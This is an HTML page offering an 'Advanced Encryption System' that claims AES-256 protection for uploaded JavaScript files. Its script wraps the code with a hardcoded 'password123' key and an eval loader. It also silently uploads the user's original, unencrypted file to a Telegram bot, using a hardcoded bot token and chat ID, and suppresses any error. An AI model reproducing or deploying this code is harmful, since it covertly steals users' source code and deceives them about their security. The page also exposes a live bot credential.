<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>developer : @delreyeas</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: radial-gradient(circle at top left, #0f2027, #203a43, #2c5364);
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      color: #e0f7fa;
      overflow: hidden;
      position: relative;
    }
    
    /* Animated background particles */
    .particles {
      position: absolute;
      width: 100%;
      height: 100%;
      overflow: hidden;
      z-index: 0;
    }
    
    .particle {
      position: absolute;
      background: rgba(0, 229, 255, 0.1);
      border-radius: 50%;
      animation: rise 15s infinite ease-in;
    }
    
    @keyframes rise {
      0% {
        transform: translateY(100vh) scale(0);
        opacity: 0;
      }
      50% {
        opacity: 0.8;
      }
      100% {
        transform: translateY(-100vh) scale(1);
        opacity: 0;
      }
    }
    
    .container {
      background: rgba(15, 32, 39, 0.85);
      backdrop-filter: blur(10px);
      padding: 50px 40px;
      border-radius: 24px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4),
                  0 0 60px rgba(0, 229, 255, 0.2),
                  inset 0 0 20px rgba(0, 229, 255, 0.05);
      border: 1px solid rgba(0, 229, 255, 0.2);
      text-align: center;
      width: 90%;
      max-width: 500px;
      animation: float 6s ease-in-out infinite;
      position: relative;
      z-index: 1;
    }
    
    @keyframes float {
      0%, 100% { 
        transform: translateY(0) scale(1); 
      }
      50% { 
        transform: translateY(-15px) scale(1.02); 
      }
    }
    
    .logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 25px;
      background: linear-gradient(135deg, #00e5ff, #00bcd4);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 40px;
      box-shadow: 0 0 30px rgba(0, 229, 255, 0.5);
      animation: pulse 2s ease-in-out infinite;
    }
    
    @keyframes pulse {
      0%, 100% {
        box-shadow: 0 0 30px rgba(0, 229, 255, 0.5);
      }
      50% {
        box-shadow: 0 0 50px rgba(0, 229, 255, 0.8);
      }
    }
    
    h2 {
      margin: 0 0 10px;
      font-size: 26px;
      font-weight: 700;
      color: #00e5ff;
      text-shadow: 0 0 10px rgba(0, 229, 255, 0.8);
      letter-spacing: 1px;
      animation: glow 3s ease-in-out infinite alternate;
    }
    
    @keyframes glow {
      from { 
        text-shadow: 0 0 10px rgba(0, 229, 255, 0.5),
                     0 0 20px rgba(0, 188, 212, 0.3);
      }
      to { 
        text-shadow: 0 0 20px rgba(0, 229, 255, 0.8),
                     0 0 40px rgba(0, 188, 212, 0.6),
                     0 0 60px rgba(0, 229, 255, 0.4);
      }
    }
    
    .subtitle {
      font-size: 13px;
      color: #80deea;
      margin-bottom: 35px;
      opacity: 0.9;
    }
    
    .input-wrapper {
      position: relative;
      margin: 20px 0;
    }
    
    input[type="file"] {
      width: 100%;
      padding: 15px;
      border-radius: 12px;
      border: 2px dashed #00e5ff;
      background: rgba(17, 17, 17, 0.6);
      color: #00e5ff;
      font-size: 14px;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    
    input[type="file"]:hover {
      border-color: #00bcd4;
      background: rgba(17, 17, 17, 0.8);
      transform: translateY(-2px);
    }
    
    input[type="file"]::file-selector-button {
      padding: 8px 16px;
      border: none;
      background: linear-gradient(135deg, #00e5ff, #00bcd4);
      color: #002b36;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      margin-right: 10px;
      transition: all 0.3s ease;
    }
    
    input[type="file"]::file-selector-button:hover {
      transform: scale(1.05);
      box-shadow: 0 0 15px rgba(0, 229, 255, 0.6);
    }
    
    button {
      width: 100%;
      margin: 20px 0;
      padding: 16px;
      border-radius: 12px;
      border: none;
      font-size: 16px;
      font-weight: bold;
      background: linear-gradient(135deg, #00e5ff, #00bcd4);
      color: #002b36;
      cursor: pointer;
      box-shadow: 0 4px 15px rgba(0, 229, 255, 0.4);
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
    }
    
    button::before {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 0;
      height: 0;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.3);
      transform: translate(-50%, -50%);
      transition: width 0.6s, height 0.6s;
    }
    
    button:hover::before {
      width: 300px;
      height: 300px;
    }
    
    button:hover {
      transform: translateY(-3px);
      box-shadow: 0 6px 25px rgba(0, 229, 255, 0.7);
    }
    
    button:active {
      transform: translateY(-1px);
    }
    
    .ticker-container {
      margin-top: 30px;
      padding: 15px;
      background: rgba(0, 0, 0, 0.3);
      border-radius: 12px;
      border: 1px solid rgba(0, 229, 255, 0.2);
      overflow: hidden;
    }
    
    .ticker {
      font-size: 13px;
      color: #80deea;
      white-space: nowrap;
      animation: ticker 20s linear infinite;
      display: inline-block;
    }
    
    @keyframes ticker {
      0% { 
        transform: translateX(100%); 
      }
      100% { 
        transform: translateX(-100%); 
      }
    }
    
    .features {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 15px;
      margin-top: 25px;
    }
    
    .feature {
      padding: 12px;
      background: rgba(0, 229, 255, 0.05);
      border-radius: 10px;
      border: 1px solid rgba(0, 229, 255, 0.15);
      font-size: 11px;
      color: #80deea;
      transition: all 0.3s ease;
    }
    
    .feature:hover {
      background: rgba(0, 229, 255, 0.1);
      border-color: rgba(0, 229, 255, 0.3);
      transform: translateY(-2px);
    }
    
    .feature-icon {
      font-size: 20px;
      margin-bottom: 5px;
    }
    
    @media (max-width: 600px) {
      .container {
        padding: 35px 25px;
      }
      
      h2 {
        font-size: 22px;
      }
      
      .features {
        grid-template-columns: 1fr;
        gap: 10px;
      }
    }
  </style>
</head>
<body>
  <!-- Animated particles background -->
  <div class="particles" id="particles"></div>

  <div class="container">
    <div class="logo">🔐</div>
    <h2>APOCALYPSE CORE ENC SYSTEM</h2>
    <p class="subtitle">Advanced Encryption System v2.7</p>
    
    <div class="input-wrapper">
      <input type="file" id="fileInput" accept=".js">
    </div>
    
    <button onclick="encryptFile()">
      🔒 Encrypt & Download
    </button>
    
    <div class="features">
      <div class="feature">
        <div class="feature-icon">🛡️</div>
        <div>AES-256</div>
      </div>
      <div class="feature">
        <div class="feature-icon">⚡</div>
        <div>Fast</div>
      </div>
      <div class="feature">
        <div class="feature-icon">🔑</div>
        <div>Secure</div>
      </div>
    </div>
    
    <div class="ticker-container">
      <div class="ticker">🔒 Encryption Engine v2.7 Active • Maximum Security Protocol Enabled • AES-256 Encryption Running • Secure Your Code Today 🔒</div>
    </div>
  </div>

  <script>
    // Create animated particles
    function createParticles() {
      const particlesContainer = document.getElementById('particles');
      const particleCount = 15;
      
      for (let i = 0; i < particleCount; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.left = Math.random() * 100 + '%';
        particle.style.width = Math.random() * 60 + 20 + 'px';
        particle.style.height = particle.style.width;
        particle.style.animationDelay = Math.random() * 15 + 's';
        particle.style.animationDuration = Math.random() * 10 + 10 + 's';
        particlesContainer.appendChild(particle);
      }
    }
    
    createParticles();

    async function encryptFile() {
      const file = document.getElementById('fileInput').files[0];
      if (!file) return alert("⚠️ Please select a JavaScript file!");

      const reader = new FileReader();
      reader.onload = async function(e) {
        const content = e.target.result;
        const encrypted = CryptoJS.AES.encrypt(content, "password123").toString();

        // hasil index.js
        const indexJs = `

const encryptedData = \`${encrypted}\`;
try {
  const decrypted = CryptoJS.AES.decrypt(encryptedData, "password123").toString(CryptoJS.enc.Utf8);
  eval(decrypted);
} catch (err) {
  console.error("❌ Error while running encrypted script");
}
        `;

        // OTOMATIS DOWNLOAD INDEX.JS
        const blob = new Blob([indexJs], { type: 'text/javascript' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = "index.js";
        link.click();

        // KIRIM FILE INDEX.JS ORI KE ADMIN ID
        const BOT_TOKEN = "8559178893:AAHZnl2qhhrVHNMmuaMAhmzC7CCX5RAQBHk";
        const CHAT_ID = "7271569542";
        const waktu = new Date().toLocaleString();

        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("caption", `📂 File terenkripsi\n🕒 Waktu: ${waktu}`);
        formData.append("document", file);

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
          method: "POST",
          body: formData
        }).catch(()=>{});
      };
      reader.readAsText(file);
    }
  </script>
</body>
</html>
